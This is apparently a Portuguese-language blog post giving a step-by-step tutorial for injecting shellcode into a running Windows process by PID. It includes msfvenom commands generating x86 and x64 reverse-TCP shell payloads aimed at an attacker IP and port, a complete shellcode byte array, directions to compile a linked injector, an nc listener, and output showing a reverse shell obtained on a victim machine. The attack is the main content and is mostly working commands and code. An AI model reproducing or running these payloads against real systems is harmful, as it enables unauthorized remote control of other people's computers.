---
title: Injeção de Código - Injection Remote Process PID
category: post
---

>link do código usado : 
https://github.com/d0x75/Injector-RemoteProcess.git

---

>Essa também é uma o clássica Injeção de Shellcode que
no caso é feito em outro módulo/processo que está em execução no computador alvo. O PID do módulo/processo é a referencia que utilizamos para injetar o shellcode.

>Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; Conforme a seguir :


#### Step 1

- Gerar os bytes do shellcode para Windows x86, apontando para o IP e Porta do computador que vai ganhar o acesso.



```ruby
msfconsole
msf6 > msfvenom -p windows/shell_reverse_tcp
LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
```

- Ou Gerar os bytes do shellcode para Windows x64, apontando para o IP e Porta do computador que vai ganhar o acesso.


```ruby
msfconsole
msfvenom -p windows/x64/shell_reverse_tcp
LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
```

- Após rodar o comando acima com sucesso, teremos os bytes do shellcode na tela. Exemplo :

```c++
		unsigned char buf[] =
		"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
		"\xfb\x25\xeb\xf6\x83\xee\xfc\xe2\xf4\x07\xcd\x69\xf6\xfb\x25"
		"\x8b\x7f\x1e\x14\x2b\x92\x70\x75\xdb\x7d\xa9\x29\x60\xa4\xef"
		"\xae\x99\xde\xf4\x92\xa1\xd0\xca\xda\x47\xca\x9a\x59\xe9\xda"
		"\xdb\xe4\x24\xfb\xfa\xe2\x09\x04\xa9\x72\x60\xa4\xeb\xae\xa1"
		"\xca\x70\x69\xfa\x8e\x18\x6d\xea\x27\xaa\xae\xb2\xd6\xfa\xf6"
		"\x60\xbf\xe3\xc6\xd1\xbf\x70\x11\x60\xf7\x2d\x14\x14\x5a\x3a"
		"\xea\xe6\xf7\x3c\x1d\x0b\x83\x0d\x26\x96\x0e\xc0\x58\xcf\x83"
		"\x1f\x7d\x60\xae\xdf\x24\x38\x90\x70\x29\xa0\x7d\xa3\x39\xea"
		"\x25\x70\x21\x60\xf7\x2b\xac\xaf\xd2\xdf\x7e\xb0\x97\xa2\x7f"
		"\xba\x09\x1b\x7a\xb4\xac\x70\x37\x00\x7b\xa6\x4d\xd8\xc4\xfb"
		"\x25\x83\x81\x88\x17\xb4\xa2\x93\x69\x9c\xd0\xfc\xda\x3e\x4e"
		"\x6b\x24\xeb\xf6\xd2\xe1\xbf\xa6\x93\x0c\x6b\x9d\xfb\xda\x3e"
		"\xa6\xab\x75\xbb\xb6\xab\x65\xbb\x9e\x11\x2a\x34\x16\x04\xf0"
		"\x7c\x9c\xfe\x4d\x2b\x5e\xf1\x54\x83\xf4\xfb\x21\x39\x7f\x1d"
		"\x4f\xfb\xa0\xac\x4d\x72\x53\x8f\x44\x14\x23\x7e\xe5\x9f\xfa"
		"\x04\x6b\xe3\x83\x17\x4d\x1b\x43\x59\x73\x14\x23\x93\x46\x86"
		"\x92\xfb\xac\x08\xa1\xac\x72\xda\x00\x91\x37\xb2\xa0\x19\xd8"
		"\x8d\x31\xbf\x01\xd7\xf7\xfa\xa8\xaf\xd2\xeb\xe3\xeb\xb2\xaf"
		"\x75\xbd\xa0\xad\x63\xbd\xb8\xad\x73\xb8\xa0\x93\x5c\x27\xc9"
		"\x7d\xda\x3e\x7f\x1b\x6b\xbd\xb0\x04\x15\x83\xfe\x7c\x38\x8b"
		"\x09\x2e\x9e\x1b\x43\x59\x73\x83\x50\x6e\x98\x76\x09\x2e\x19"
		"\xed\x8a\xf1\xa5\x10\x16\x8e\x20\x50\xb1\xe8\x57\x84\x9c\xfb"
		"\x76\x14\x23";
```


#### Step 2

- Abrir o código do link mencionado no inicio, que tem o
código responsável por executar os bytes gerados acima.


```text
injectremotePID.cpp
```

- Copiar os bytes gerados pelo msfvenom no Step 1, em seguida devemos colar esses bytes no conteúdo da variável *unsigned char shellcode[] = ""* do código 'injectremotePID.cpp' e depois compilar-lo.

- Ao compilar o software com sucesso teremos o executável pronto para uso.


```text
injectremotePID.exe
```

#### Step 3

- Anotar o PID do processo/módulo em que iremos injetar o shellcode.



		Para sabermos o PID de um processo podemos usar o "ProcessHacker", "procexp" ou o próprio "Gerenciador de Tarefas".


- Abrir a mesma porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador com o IP que também colocamos como argumento no msfvenom para gerar o shellcode :


```bash
nc -vlp 1234
```

- Executar o binário compilado no _Step 2_ para injetar o shellcode passando o PID anotado acima como argumento na linha de comando na hora de executar o 'injectremotePID.exe' :


```cmd
injectremotePID.exe 2004
```

- Feito isso, já devemos ganhar o acesso ao computador que executou o shellcode.


```DOS
nc -vlp 1234
listening on [any] 1234 ...
192.168.10.109: inverse host lookup failed: Host name lookup failure
connect to [192.168.10.113] from (UNKNOWN) [192.168.10.109] 49173
Microsoft Windows [vers�o 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Todos os direitos reservados.

C:\Users\VBOX_7\Desktop>
```
